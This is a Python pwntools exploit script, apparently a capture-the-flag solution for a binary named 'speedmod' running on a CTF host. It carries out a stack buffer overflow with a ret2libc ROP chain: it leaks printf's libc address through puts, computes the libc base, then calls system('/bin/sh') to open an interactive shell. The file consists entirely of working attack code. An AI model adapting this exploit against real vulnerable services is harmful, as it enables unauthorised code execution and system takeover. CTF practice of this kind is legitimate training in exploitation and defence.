#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'speed-01.hfsc.tf', 61000
binary = './speedmod'
brkpts = '''
'''

elf = ELF("speedmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

if __name__ == "__main__":
    reu("b0fz: ")

    pop_rdi = 0x4012b3
    ret = 0x40101a
    main = 0x4011cb
    payload = "a"*40 + flat([
        pop_rdi,
        elf.got['printf'],
        elf.plt['puts'],
        main
    ])

    sl(payload)

    libc.address = uu64(re(6)) - libc.symbols['printf']

    log.info("libc @ "+hex(libc.address))

    reu("b0fz: ")
    payload = "a"*40 + flat([
        pop_rdi,
        next(libc.search("/bin/sh")),
        ret,
        libc.symbols['system']
    ])

    sl(payload)

    io.interactive()
